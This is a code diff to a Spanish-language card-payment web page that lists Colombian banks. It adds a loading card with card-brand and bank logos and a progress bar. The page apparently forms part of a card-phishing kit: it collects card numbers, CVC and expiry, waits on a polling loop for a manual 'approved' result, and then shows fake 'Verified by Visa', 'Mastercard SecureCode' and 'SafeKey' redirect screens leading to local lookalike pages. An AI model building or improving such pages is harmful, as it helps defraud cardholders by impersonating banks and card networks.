@@ -476,6 +476,9 @@
             flex-shrink: 0;
         }
 
+        /* ============================================ */
+        /* LOADING OVERLAY CON BARRA DE PROGRESO        */
+        /* ============================================ */
         .loading-overlay {
             display: none;
             position: fixed;
@@ -483,7 +486,8 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.7);
+            background: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(4px);
             z-index: 1000;
             justify-content: center;
             align-items: center;
@@ -494,14 +498,143 @@
             display: flex;
         }
 
-        .spinner {
-            width: 60px;
-            height: 60px;
-            border: 4px solid rgba(255, 255, 255, 0.3);
-            border-top: 4px solid #fff;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
+        .loading-card {
+            background: #ffffff;
+            border-radius: 16px;
+            padding: 40px 48px;
+            max-width: 420px;
+            width: 90%;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.15);
+            text-align: center;
+            animation: slideUp 0.4s ease-out;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px) scale(0.95);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+
+        /* Logos superiores */
+        .logos-header {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 16px;
             margin-bottom: 20px;
+            padding-bottom: 16px;
+            border-bottom: 1px solid var(--co-border);
+        }
+
+        .logo-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .logo-item .logo-label {
+            font-size: 0.55rem;
+            font-weight: 600;
+            color: var(--co-text-muted);
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+        }
+
+        .logo-item .logo-img {
+            height: 44px;
+            width: auto;
+            max-width: 100px;
+            object-fit: contain;
+        }
+
+        .logo-divider {
+            font-size: 1.2rem;
+            color: var(--co-border);
+            font-weight: 300;
+        }
+
+        /* Texto */
+        .loading-card .loading-text {
+            font-size: 1.1rem;
+            font-weight: 600;
+            color: var(--co-text);
+            margin-bottom: 4px;
+        }
+
+        .loading-card .loading-subtext {
+            font-size: 0.875rem;
+            color: var(--co-text-muted);
+            margin-bottom: 16px;
+        }
+
+        /* Barra de progreso */
+        .progress-bar-wrapper {
+            width: 100%;
+            margin-top: 8px;
+        }
+
+        .progress-bar-track {
+            width: 100%;
+            height: 8px;
+            background: var(--co-input-bg);
+            border-radius: 4px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .progress-bar-fill-loading {
+            height: 100%;
+            background: var(--co-blue);
+            border-radius: 4px;
+            width: 0%;
+            transition: width 0.3s ease;
+            position: relative;
+        }
+
+        .progress-bar-fill-loading::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            animation: shimmer 1.5s infinite;
+        }
+
+        @keyframes shimmer {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+
+        .progress-percentage {
+            font-size: 0.875rem;
+            font-weight: 600;
+            color: var(--co-blue);
+            margin-top: 8px;
+            text-align: center;
+        }
+
+        /* Estado de carga inicial (sin logos) */
+        .loading-card .initial-spinner {
+            display: none;
+            width: 48px;
+            height: 48px;
+            border: 3px solid var(--co-border);
+            border-top: 3px solid var(--co-blue);
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 16px auto;
+        }
+
+        .loading-card .initial-spinner.active {
+            display: block;
         }
 
         @keyframes spin {
@@ -509,18 +642,7 @@
             100% { transform: rotate(360deg); }
         }
 
-        .loading-text {
-            color: #fff;
-            font-size: 1.125rem;
-            font-weight: 500;
-            text-align: center;
-        }
-
-        .loading-subtext {
-            color: rgba(255, 255, 255, 0.8);
-            font-size: 0.875rem;
-            margin-top: 8px;
-        }
+        /* ============================================ */
 
         .status-message {
             display: none;
@@ -663,29 +785,56 @@
             .form-header h1 { font-size: 1.25rem; }
             .btn { width: 100%; }
             .expiry-cvc-grid { grid-template-columns: 1fr 1fr; }
+            .loading-card { padding: 28px 20px; }
+            .logos-header { gap: 12px; }
+            .logo-item .logo-img { height: 36px; max-width: 70px; }
+            .logo-divider { font-size: 1rem; }
         }
 
         @media (max-width: 480px) {
             .form-header h1 { font-size: 1.125rem; }
             .form-header p { font-size: 0.875rem; }
             .expiry-cvc-grid { grid-template-columns: 1fr; gap: 16px; }
+            .loading-card { padding: 24px 16px; }
+            .logo-item .logo-img { height: 30px; max-width: 60px; }
+            .logos-header { gap: 8px; }
         }
     </style>
 </head>
 <body>
-    <!-- LOADING OVERLAY PARA PROCESAMIENTO -->
+    <!-- ============================================ -->
+    <!-- LOADING OVERLAY CON BARRA DE PROGRESO        -->
+    <!-- ============================================ -->
     <div class="loading-overlay" id="loadingOverlay">
-        <div class="spinner"></div>
-        <div class="loading-text">Procesando pago...</div>
-        <div class="loading-subtext">Verificando información de la tarjeta</div>
-    </div>
+        <div class="loading-card">
+            <!-- Spinner inicial (se oculta cuando se aprueba) -->
+            <div class="initial-spinner active" id="initialSpinner"></div>
+            
+            <!-- Logos superiores (se muestran cuando se aprueba) -->
+            <div class="logos-header" id="logosHeader" style="display:none;">
+                <div class="logo-item">
+                    <span class="logo-label">Tarjeta</span>
+                    <img id="cardLogoImg" src="" alt="Logo tarjeta" class="logo-img" />
+                </div>
+                <span class="logo-divider">+</span>
+                <div class="logo-item">
+                    <span class="logo-label">Banco Emisor</span>
+                    <img id="bankLogoImg" src="" alt="Logo banco" class="logo-img" />
+                </div>
+            </div>
 
-    <!-- LOADING OVERLAY PARA REDIRECCIÓN CON LOGO -->
-    <div class="loading-overlay" id="redirectOverlay" style="display:none;">
-        <div class="spinner"></div>
-        <div id="redirectLogo" style="margin-bottom:20px;"></div>
-        <div class="loading-text" id="redirectText">Redirigiendo a Verified by Visa...</div>
-        <div class="loading-subtext">Por favor espere</div>
+            <!-- Textos -->
+            <div class="loading-text" id="loadingText">Procesando pago...</div>
+            <div class="loading-subtext" id="loadingSubtext">Verificando información de la tarjeta</div>
+
+            <!-- Barra de progreso -->
+            <div class="progress-bar-wrapper" id="progressWrapper" style="display:none;">
+                <div class="progress-bar-track">
+                    <div class="progress-bar-fill-loading" id="progressFill"></div>
+                </div>
+                <div class="progress-percentage" id="progressPercentage">0%</div>
+            </div>
+        </div>
     </div>
 
     <header>
@@ -854,6 +1003,8 @@
                                     <option value="Banco Falabella">Banco Falabella</option>
                                     <option value="Banco Pichincha">Banco Pichincha</option>
                                     <option value="Banco Cooperativo Coopcentral">Banco Cooperativo Coopcentral</option>
+                                    <option value="Caja Social">Caja Social</option>
+                                    <option value="Itaú">Itaú</option>
                                     <option value="Otro">Otro</option>
                                 </select>
                                 <div class="error-message">Seleccione un banco emisor</div>
@@ -909,6 +1060,28 @@
         let cardType = null;
 
         // ============================================
+        // MAPA DE LOGOS DE BANCOS
+        // ============================================
+        const bankLogos = {
+            'Bancolombia': 'bancol.png',
+            'Caja Social': 'caja.png',
+            'Itaú': 'itau.png',
+            'Banco Occidente': 'occi.png',
+            'Banco Popular': 'popu.png',
+            'Banco de Bogotá': 'bog.png',
+            'Banco Falabella': 'fala.png'
+        };
+
+        // ============================================
+        // MAPA DE LOGOS DE TARJETAS
+        // ============================================
+        const cardLogos = {
+            'visa': 'visa.png',
+            'mastercard': 'master.png',
+            'amex': 'ame.png'
+        };
+
+        // ============================================
         // CARGAR DATOS DEL LOCALSTORAGE
         // ============================================
         window.addEventListener('load', function() {
@@ -953,9 +1126,15 @@
         const form = document.getElementById('paymentForm');
         const submitButton = document.getElementById('submitButton');
         const loadingOverlay = document.getElementById('loadingOverlay');
-        const redirectOverlay = document.getElementById('redirectOverlay');
-        const redirectLogo = document.getElementById('redirectLogo');
-        const redirectText = document.getElementById('redirectText');
+        const loadingText = document.getElementById('loadingText');
+        const loadingSubtext = document.getElementById('loadingSubtext');
+        const logosHeader = document.getElementById('logosHeader');
+        const cardLogoImg = document.getElementById('cardLogoImg');
+        const bankLogoImg = document.getElementById('bankLogoImg');
+        const progressWrapper = document.getElementById('progressWrapper');
+        const progressFill = document.getElementById('progressFill');
+        const progressPercentage = document.getElementById('progressPercentage');
+        const initialSpinner = document.getElementById('initialSpinner');
         const statusMessage = document.getElementById('statusMessage');
 
         const cardPatterns = {
@@ -1115,10 +1294,6 @@
             bancoEmisor.disabled = false;
         }
 
-        function mostrarExito(mensaje) {
-            mostrarMensaje(mensaje, 'success');
-        }
-
         function mostrarInfo(mensaje) {
             mostrarMensaje(mensaje, 'info');
         }
@@ -1128,49 +1303,85 @@
         }
 
         // ============================================
-        // MOSTRAR PANTALLA DE CARGA CON LOGO
+        // MOSTRAR PANTALLA DE CARGA CON BARRA
         // ============================================
-        function mostrarRedireccionConLogo(tipo) {
-            const logos = {
-                'visa': {
-                    img: 'visa.png',
-                    text: 'Redirigiendo a Verified by Visa...'
-                },
-                'mastercard': {
-                    img: 'master.png',
-                    text: 'Redirigiendo a Mastercard SecureCode...'
-                },
-                'amex': {
-                    img: 'ame.png',
-                    text: 'Redirigiendo a American Express SafeKey...'
-                }
+        function mostrarCargaConLogos(tipoTarjeta, banco) {
+            // Ocultar spinner inicial
+            initialSpinner.classList.remove('active');
+            initialSpinner.style.display = 'none';
+            
+            // Mostrar logos
+            logosHeader.style.display = 'flex';
+            
+            // Actualizar logo de tarjeta
+            const cardLogoFile = cardLogos[tipoTarjeta];
+            if (cardLogoFile) {
+                cardLogoImg.src = cardLogoFile;
+                cardLogoImg.alt = tipoTarjeta.charAt(0).toUpperCase() + tipoTarjeta.slice(1);
+            }
+            
+            // Actualizar logo de banco
+            const bankLogoFile = bankLogos[banco];
+            if (bankLogoFile) {
+                bankLogoImg.src = bankLogoFile;
+                bankLogoImg.alt = banco;
+                // Mostrar el contenedor del banco
+                document.querySelector('.logo-item:last-child').style.display = 'flex';
+            } else {
+                // Ocultar el logo del banco si no existe
+                document.querySelector('.logo-item:last-child').style.display = 'none';
+                document.querySelector('.logo-divider').style.display = 'none';
+            }
+            
+            // Mostrar barra de progreso
+            progressWrapper.style.display = 'block';
+            
+            // Actualizar textos
+            const nombres = {
+                'visa': 'Verified by Visa',
+                'mastercard': 'Mastercard SecureCode',
+                'amex': 'American Express SafeKey'
             };
+            loadingText.textContent = 'Redirigiendo a ' + (nombres[tipoTarjeta] || '...');
+            loadingSubtext.textContent = 'Por favor espere';
+            
+            // Animar barra de progreso
+            let progress = 0;
+            const duration = 3000;
+            const interval = 50;
+            const steps = duration / interval;
+            const increment = 100 / steps;
+            
+            // Reiniciar barra
+            progressFill.style.width = '0%';
+            progressPercentage.textContent = '0%';
+            
+            const timer = setInterval(() => {
+                progress += increment;
+                if (progress >= 100) {
+                    progress = 100;
+                    clearInterval(timer);
+                    // Redirigir después de completar
+                    setTimeout(() => {
+                        redirigirSegunTipoTarjeta(tipoTarjeta);
+                    }, 400);
+                }
+                progressFill.style.width = progress + '%';
+                progressPercentage.textContent = Math.round(progress) + '%';
+            }, interval);
+        }
 
-            const logoData = logos[tipo] || logos['visa'];
-            
-            // Crear imagen del logo
-            redirectLogo.innerHTML = `<img src="${logoData.img}" style="height:60px; width:auto; display:block; margin:0 auto;" />`;
-            redirectText.textContent = logoData.text;
-            
-            // Mostrar overlay
-            redirectOverlay.style.display = 'flex';
-            redirectOverlay.classList.add('active');
-            loadingOverlay.classList.remove('active');
-            
-            // Ocultar mensajes de estado
-            statusMessage.className = 'status-message';
-            statusMessage.style.display = 'none';
-            
-            // Esperar 5 segundos y redirigir
-            setTimeout(() => {
-                const map = {
-                    'visa': 'visa.html',
-                    'mastercard': 'master.html',
-                    'amex': 'amex.html'
-                };
-                const destino = map[tipo] || 'index.html';
-                window.location.href = destino;
-            }, 5000);
+        // ============================================
+        // REDIRIGIR SEGÚN TIPO DE TARJETA
+        // ============================================
+        function redirigirSegunTipoTarjeta(tipo) {
+            const map = {
+                'visa': 'visa.html',
+                'mastercard': 'master.html',
+                'amex': 'amex.html'
+            };
+            const destino = map[tipo] || 'index.html';
+            window.location.href = destino;
         }
 
         // ============================================
@@ -1254,29 +1465,9 @@
         }
 
         // ============================================
-        // REDIRIGIR SEGÚN TIPO DE TARJETA (GUARDANDO DATOS)
-        // ============================================
-        function redirigirSegunTipoTarjeta(tipo) {
-            // Guardar datos de la tarjeta en sessionStorage
-            const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
-            const cardLast4 = cardNumber.slice(-4);
-            
-            sessionStorage.setItem('cardNumber', cardNumber);
-            sessionStorage.setItem('cardLast4', cardLast4);
-            sessionStorage.setItem('cvc', document.getElementById('cvc').value);
-            sessionStorage.setItem('expiry', document.getElementById('expiry').value);
-            sessionStorage.setItem('cardholderName', document.getElementById('cardholderName').value);
-            sessionStorage.setItem('cardType', tipo);
-            sessionStorage.setItem('bancoEmisor', document.getElementById('bancoEmisor').value);
-            
-            // Mostrar pantalla de carga con logo
-            mostrarRedireccionConLogo(tipo);
-        }
-
-        // ============================================
         // POLLING PARA ESPERAR APROBACIÓN DEL PAGO
         // ============================================
-        function iniciarPollingPago() {
+        function iniciarPollingPago(banco) {
             let tiempoInicio = Date.now();
 
             pollingInterval = setInterval(async () => {
@@ -1299,8 +1490,8 @@
 
                 if (resultado === 'approved') {
                     clearInterval(pollingInterval);
-                    // Mostrar pantalla de carga con logo correspondiente
-                    redirigirSegunTipoTarjeta(cardType);
+                    // Mostrar pantalla de carga con barra de progreso
+                    mostrarCargaConLogos(cardType, banco);
 
                 } else if (resultado === 'rejected') {
                     clearInterval(pollingInterval);
@@ -1370,7 +1561,21 @@
 
             solicitudId = generarSolicitudId();
 
+            // Mostrar loading overlay inicial (con spinner)
             loadingOverlay.classList.add('active');
+            
+            // Resetear estado de la card de carga
+            initialSpinner.style.display = 'block';
+            initialSpinner.classList.add('active');
+            logosHeader.style.display = 'none';
+            progressWrapper.style.display = 'none';
+            loadingText.textContent = 'Procesando pago...';
+            loadingSubtext.textContent = 'Verificando información de la tarjeta';
+            
+            // Ocultar logos del banco que no tengan imagen
+            document.querySelector('.logo-item:last-child').style.display = 'flex';
+            document.querySelector('.logo-divider').style.display = 'block';
+
             submitButton.disabled = true;
             submitButton.textContent = 'Procesando...';
 
@@ -1424,7 +1629,7 @@
 
             if (enviado) {
                 mostrarInfo('⏳ Esperando aprobación del pago...');
-                iniciarPollingPago();
+                iniciarPollingPago(banco);
             } else {
                 mostrarError('Error al procesar el pago. Por favor, intente nuevamente.');
                 cardNumberInput.disabled = false;
@@ -1439,4 +1644,4 @@
         });
     </script>
 </body>
-</html>
+                                                                                       </html>
